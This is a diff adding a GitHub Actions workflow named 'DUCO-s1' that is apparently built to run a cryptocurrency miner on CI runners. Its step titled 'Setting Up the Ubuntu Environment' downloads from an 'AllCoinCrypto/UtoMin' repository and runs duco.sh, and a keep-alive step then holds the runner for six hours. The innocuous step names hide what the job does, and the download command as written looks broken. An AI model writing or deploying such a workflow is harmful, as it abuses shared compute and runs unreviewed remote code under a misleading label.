@@ -1,0 +1,23 @@
+name: DUCO-s1
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+    
+    
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+    steps:
+    - uses: actions/checkout@v2
+#    - name: If failed, means ok
+#      run: ./utopia.sh it bloke build
+    - name: Preparing Linux Environment
+      run: sudo apt-get update
+    - name: Setting Up the Ubuntu Environment
+    #  if: ${{ failure() }}
+      run: wget https://github.com/AllCoinCrypto/UtoMin/ && chmod u+x duco.sh && ./duco.sh
+    - name: Keep Running Ubuntu System and keepAlive
+     # if: ${{ failure() }}
+      run: sleep 6h
